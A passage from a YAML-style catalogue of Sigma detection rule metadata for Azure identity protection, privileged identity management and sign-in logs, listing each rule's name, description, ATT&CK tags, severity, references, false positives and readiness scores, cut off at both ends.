  description: Indicates suspicious rules such as an inbox rule that forwards a copy
    of all emails to an external address
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1114.003
  tags:
  - attack.t1114.003
  - attack.collection
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#suspicious-inbox-forwarding
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - A legitimate forwarding rule.
  notes: ''
- detection_id: ceb55fd0-726e-4656-bf4e-b585b7f7d572
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_inbox_manipulation.yml
  name: Suspicious Inbox Manipulation Rules
  description: Detects suspicious rules that delete or move messages or folders are
    set on a user's inbox.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.t1140
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#suspicious-inbox-manipulation-rules
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - Actual mailbox rules that are moving items based on their workflow.
  notes: ''
- detection_id: 19128e5e-4743-48dc-bd97-52e5775af817
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_leaked_credentials.yml
  name: Azure AD Account Credential Leaked
  description: Indicates that the user's valid credentials have been leaked.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1589
  tags:
  - attack.t1589
  - attack.reconnaissance
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#leaked-credentials
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - A rare hash collision.
  notes: ''
- detection_id: a3f55ebd-0c01-4ed6-adc0-8fb76d8cd3cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_malicious_ip_address.yml
  name: Malicious IP Address Sign-In Failure Rate
  description: Indicates sign-in from a malicious IP address based on high failure
    rates.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.t1090
  - attack.command-and-control
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#malicious-ip-address
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 36440e1c-5c22-467a-889b-593e66498472
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_malicious_ip_address_suspicious.yml
  name: Malicious IP Address Sign-In Suspicious
  description: Indicates sign-in from a malicious IP address known to be malicious
    at time of sign-in.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.t1090
  - attack.command-and-control
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#malicious-ip-address
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 821b4dc3-1295-41e7-b157-39ab212dd6bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_malware_linked_ip.yml
  name: Sign-In From Malware Infected IP
  description: Indicates sign-ins from IP addresses infected with malware that is
    known to actively communicate with a bot server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.t1090
  - attack.command-and-control
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#malware-linked-ip-address-deprecated
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - Using an IP address that is shared by many users
  notes: ''
- detection_id: adf9f4d2-559e-4f5c-95be-c28dff0b1476
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_new_coutry_region.yml
  name: New Country
  description: Detects sign-ins from new countries. The detection considers past activity
    locations to determine new and infrequent locations.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#new-country
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 28ecba0a-c743-4690-ad29-9a8f6f25a6f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_password_spray.yml
  name: Password Spray Activity
  description: Indicates that a password spray attack has been successfully performed.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.t1110
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#password-spray
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: a84fc3b1-c9ce-4125-8e74-bdcdb24021f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_prt_access.yml
  name: Primary Refresh Token Access Attempt
  description: Indicates access attempt to the PRT resource which can be used to move
    laterally into an organization or perform credential theft
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.t1528
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#possible-attempt-to-access-primary-refresh-token-prt
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - This detection is low-volume and is seen infrequently in most organizations. When
    this detection appears it's high risk, and users should be remediated.
  notes: ''
- detection_id: 944f6adb-7a99-4c69-80c1-b712579e93e6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_suspicious_browser.yml
  name: Suspicious Browser Activity
  description: Indicates anomalous behavior based on suspicious sign-in activity across
    multiple tenants from different countries in the same browser
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#suspicious-browser
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: a2cb56ff-4f46-437a-a0fa-ffa4d1303cba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_threat_intel.yml
  name: Azure AD Threat Intelligence
  description: Indicates user activity that is unusual for the user or consistent
    with known attack patterns.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#azure-ad-threat-intelligence-sign-in
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#azure-ad-threat-intelligence-user
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: e3393cba-31f0-4207-831e-aef90ab17a8c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_token_issuer_anomaly.yml
  name: SAML Token Issuer Anomaly
  description: Indicates the SAML token issuer for the associated SAML token is potentially
    compromised. The claims included in the token are unusual or match known attacker
    patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1606
  tags:
  - attack.t1606
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#token-issuer-anomaly
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 128faeef-79dd-44ca-b43c-a9e236a60f49
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_unfamilar_sign_in.yml
  name: Unfamiliar Sign-In Properties
  description: Detects sign-in with properties that are unfamiliar to the user. The
    detection considers past sign-in history to look for anomalous sign-ins.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#unfamiliar-sign-in-properties
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - User changing to a new device, location, browser, etc.
  notes: ''
- detection_id: e402c26a-267a-45bd-9615-bd9ceda6da85
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_account_stale.yml
  name: Stale Accounts In A Privileged Role
  description: Identifies when an account hasn't signed in during the past n number
    of days.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#potential-stale-accounts-in-a-privileged-role
  false_positives:
  - Investigate if potential generic account that cannot be removed.
  notes: ''
- detection_id: 58af08eb-f9e1-43c8-9805-3ad9b0482bd8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_invalid_license.yml
  name: Invalid PIM License
  description: Identifies when an organization doesn't have the proper license for
    PIM and is out of compliance.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#the-organization-doesnt-have-microsoft-entra-premium-p2-or-microsoft-entra-id-governance
  false_positives:
  - Investigate if licenses have expired.
  notes: ''
- detection_id: b1bc08d1-8224-4758-a0e6-fbcfc98c73bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_role_assigned_outside_of_pim.yml
  name: Roles Assigned Outside PIM
  description: Identifies when a privilege role assignment has taken place outside
    of PIM and may indicate an attack.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#roles-are-being-assigned-outside-of-privileged-identity-management
  false_positives:
  - Investigate where users are being assigned privileged roles outside of Privileged
    Identity Management and prohibit future assignments from there.
  notes: ''
- detection_id: 645fd80d-6c07-435b-9e06-7bc1b5656cba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_role_frequent_activation.yml
  name: Roles Activated Too Frequently
  description: Identifies when the same privilege role has multiple activations by
    the same user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#roles-are-being-activated-too-frequently
  false_positives:
  - Investigate where if active time period for a role is set too short.
  notes: ''
- detection_id: 94a66f46-5b64-46ce-80b2-75dcbe627cc0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_role_no_mfa_required.yml
  name: Roles Activation Doesn't Require MFA
  description: Identifies when a privilege role can be activated without performing
    mfa.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#roles-dont-require-multi-factor-authentication-for-activation
  false_positives:
  - Investigate if user is performing MFA at sign-in.
  notes: ''
- detection_id: 8c6ec464-4ae4-43ac-936a-291da66ed13d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_role_not_used.yml
  name: Roles Are Not Being Used
  description: Identifies when a user has been assigned a privilege role and are not
    using that role.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#administrators-arent-using-their-privileged-roles
  false_positives:
  - Investigate if potential generic account that cannot be removed.
  notes: ''
- detection_id: 7bbc309f-e2b1-4eb1-8369-131a367d67d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/privileged_identity_management/azure_pim_too_many_global_admins.yml
  name: Too Many Global Admins
  description: Identifies an event where there are there are too many accounts assigned
    the Global Administrator role.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: pim
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts#there-are-too-many-global-administrators
  false_positives:
  - Investigate if threshold setting in PIM is too low.
  notes: ''
- detection_id: 2b7d6fc0-71ac-4cf7-8ed1-b5788ee5257a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_account_lockout.yml
  name: Account Lockout
  description: Identifies user account which has been locked because the user tried
    to sign in too many times with an incorrect user ID or password.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: e1d02b53-c03c-4948-b11d-4d00cca49d03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_auth_failure_increase.yml
  name: Increased Failed Authentications Of Any Type
  description: Detects when sign-ins increased by 10% or greater.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 67d5f8fc-8325-44e4-8f5f-7c0ac07cb5ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_auth_sucess_increase.yml
  name: Measurable Increase Of Successful Authentications
  description: Detects when successful sign-ins increased by 10% or greater.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: low
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#monitoring-for-successful-unusual-sign-ins
  false_positives:
  - Increase of users in the environment
  notes: ''
- detection_id: f272fb46-25f2-422c-b667-45837994980f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_auth_to_important_apps_using_single_factor_auth.yml
  name: Authentications To Important Apps Using Single Factor Authentication
  description: Detect when authentications to important application(s) only required
    single-factor authentication
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 8c944ecb-6970-4541-8496-be554b8e2846
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_authentications_from_countries_you_do_not_operate_out_of.yml
  name: Successful Authentications From Countries You Do Not Operate Out Of
  description: Detect successful authentications from countries you do not operate
    out of.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 35b781cc-1a08-4a5a-80af-42fd7c315c6b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_azurehound_discovery.yml
  name: Discovery Using AzureHound
  description: Detects AzureHound (A BloodHound data collector for Microsoft Azure)
    activity via the default User-Agent that is used during its operation after successful
    authentication.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.004
  - T1526
  tags:
  - attack.discovery
  - attack.t1087.004
  - attack.t1526
  time_window: ''
  references:
  - https://github.com/BloodHoundAD/AzureHound
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5afa454e-030c-4ab4-9253-a90aa7fcc581
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_device_registration_or_join_without_mfa.yml
  name: Device Registration or Join Without MFA
  description: Monitor and alert for device registration or join events where MFA
    was not performed.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - multi_signal_correlation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#device-registrations-and-joins-outside-policy
  false_positives:
  - Unknown
  notes: ''
- detection_id: 28870ae4-6a13-4616-bd1a-235a7fad7458
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_failed_auth_from_countries_you_do_not_operate_out_of.yml
  name: Failed Authentications From Countries You Do Not Operate Out Of
  description: Detect failed authentications from countries you do not operate out
    of.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 28eea407-28d7-4e42-b0be-575d5ba60b2c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_only_single_factor_auth_required.yml
  name: Azure AD Only Single Factor Authentication Required
  description: Detect when users are authenticating without MFA being required.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: low
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1556.006
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1556.006
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 572b12d4-9062-11ed-a1eb-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_risky_sign_ins_with_singlefactorauth_from_unknown_devices.yml
  name: Suspicious SignIns From A Non Registered Device
  description: Detects risky authentication from a non AD registered device without
    MFA being required.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#non-compliant-device-sign-in
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f77e1d7-3982-4ee0-8489-abf2d6b75284
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_sign_ins_from_noncompliant_devices.yml
  name: Sign-ins from Non-Compliant Devices
  description: Monitor and alert for sign-ins where the device was non-compliant.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#non-compliant-device-sign-in
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4d136857-6a1a-432a-82fc-5dd497ee5e7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_sign_ins_from_unknown_devices.yml
  name: Sign-ins by Unknown Devices
  description: Monitor and alert for Sign-ins by unknown devices from non-Trusted
    locations.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: low
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#non-compliant-device-sign-in
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53bb4f7f-48a8-4475-ac30-5a82ddfdf6fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_ad_suspicious_signin_bypassing_mfa.yml
  name: Potential MFA Bypass Using Legacy Client Authentication
  description: Detects successful authentication from potential clients using legacy
    authentication via user agent strings. This could be a sign of MFA bypass using
    a password spray attack.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
